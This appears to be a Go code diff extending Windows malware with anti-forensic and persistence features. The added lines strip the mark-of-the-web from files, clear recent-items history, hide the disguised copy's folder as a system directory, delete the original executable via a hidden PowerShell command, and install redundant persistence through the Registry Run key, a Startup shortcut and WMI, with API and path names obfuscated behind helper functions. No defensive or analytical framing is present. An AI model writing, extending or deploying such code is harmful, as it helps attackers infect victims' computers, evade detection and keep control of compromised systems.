@@ -108,6 +108,12 @@ func tryDisguiseCopy(exePath string) (string, bool) {
 		}
 
 		touchTimestamps(target)
+		removeZoneIdentifier(target)
+
+		if hideFilesEnabled {
+			_ = windows.SetFileAttributes(windows.StringToUTF16Ptr(dir), uint32(windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM))
+		}
+
 		return target, true
 	}
 
@@ -121,6 +127,9 @@ func runPrimaryWithWorker() {
 		return
 	}
 
+	removeZoneIdentifier(exePath)
+	go clearRecentItems()
+
 	disguisedPath, copied := tryDisguiseCopy(exePath)
 
 	opSetupTask(disguisedPath)
@@ -132,11 +141,22 @@ func runPrimaryWithWorker() {
 		cmd := exec.Command(disguisedPath, "worker")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		if err := cmd.Start(); err == nil {
+			selfDeleteOriginal(exeNorm)
 			return
 		}
 	}
 
 	loopA()
+}
+
+func selfDeleteOriginal(exePath string) {
+	if strings.TrimSpace(exePath) == "" {
+		return
+	}
+	escaped := strings.ReplaceAll(exePath, "'", "''")
+	psCmd := fmt.Sprintf("Start-Sleep -Seconds 2; Remove-Item -Force '%s' -ErrorAction SilentlyContinue", escaped)
+	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCmd)
+	_ = cmd.Start()
 }
 
 func runWorkerGuard() {
@@ -194,6 +214,76 @@ func healPersistence() {
 
 	if !isWmiPersistencePresent() {
 		opAddWmiPersistence(expectedWorker)
+	}
+}
+
+func healPersistenceLight() {
+	exePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+
+	localApp := os.Getenv(getLocalAppDataEnv())
+	msDir := getMicrosoftDirName()
+	exeName := getDisguisedExeName()
+
+	dirs := getDisguiseCandidates()
+	var workerPath string
+	for _, d := range dirs {
+		candidate := filepath.Join(localApp, msDir, d, exeName)
+		if _, err := os.Stat(candidate); err == nil {
+			workerPath = candidate
+			break
+		}
+	}
+
+	if workerPath == "" {
+		_, copied := tryDisguiseCopy(exePath)
+		if copied {
+			localApp = os.Getenv(getLocalAppDataEnv())
+			for _, d := range dirs {
+				candidate := filepath.Join(localApp, msDir, d, exeName)
+				if _, err := os.Stat(candidate); err == nil {
+					workerPath = candidate
+					break
+				}
+			}
+		}
+		if workerPath == "" {
+			workerPath = exePath
+		}
+	}
+
+	removeZoneIdentifier(workerPath)
+
+	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
+	regOpenKeyEx := advapi32.NewProc(getRegOpenKeyExWName())
+	regQueryValueEx := advapi32.NewProc("RegQueryValueExW")
+	regCloseKey := advapi32.NewProc(getRegCloseKeyName())
+	keyPath, _ := syscall.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+	var hKey syscall.Handle
+	ret, _, _ := regOpenKeyEx.Call(uintptr(0x80000001), uintptr(unsafe.Pointer(keyPath)), 0, uintptr(0x20019), uintptr(unsafe.Pointer(&hKey)))
+	if ret == 0 {
+		valName, _ := syscall.UTF16PtrFromString(getDisplayName())
+		var vType uint32
+		var dataSize uint32
+		r2, _, _ := regQueryValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, uintptr(unsafe.Pointer(&vType)), 0, uintptr(unsafe.Pointer(&dataSize)))
+		regCloseKey.Call(uintptr(hKey))
+		if r2 != 0 {
+			opAddRegistryRun(workerPath)
+		}
+	} else {
+		opAddRegistryRun(workerPath)
+	}
+
+	startupDir := filepath.Join(os.Getenv(getAppDataEnvName()), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	lnkPath := filepath.Join(startupDir, getDisplayName()+".lnk")
+	if _, err := os.Stat(lnkPath); err != nil {
+		opAddStartupShortcut(workerPath)
+	}
+
+	if !isWmiPersistencePresent() {
+		opAddWmiPersistence(workerPath)
 	}
 }
 `)
